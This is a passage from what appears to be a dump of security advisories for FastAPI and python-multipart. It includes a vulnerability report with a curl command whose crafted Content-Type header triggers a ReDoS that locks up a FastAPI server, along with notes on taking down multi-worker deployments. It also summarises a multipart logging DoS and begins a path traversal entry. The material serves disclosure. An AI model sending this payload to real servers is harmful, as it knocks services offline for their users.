My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>"}, {"id": "CVE-2024-53981", "fix_versions": ["0.0.18"], "aliases": ["GHSA-59g5-xgcq-4qw3"], "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.  An attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).  ### Impact  Applications that use `python-multipart` to parse form data (or use frameworks that do so) are affected.   ### Original Report  This security issue was reported by: - GitHub security advisory in Starlette on October 30 by @Startr4ck - Email to `python-multipart` maintainer on October 3 by @mnqazi"}, {"id": "CVE-2026-24486", "fix_versions": ["0.0.22"], "aliases": ["GHSA-wp53-j4wj-2cfg"], "description": "### Summary  A Path Traversal vulnerability exists when using non-default configuration options `UPLOAD_DIR` and `UPLOAD_KEEP_FILENAME=True`.
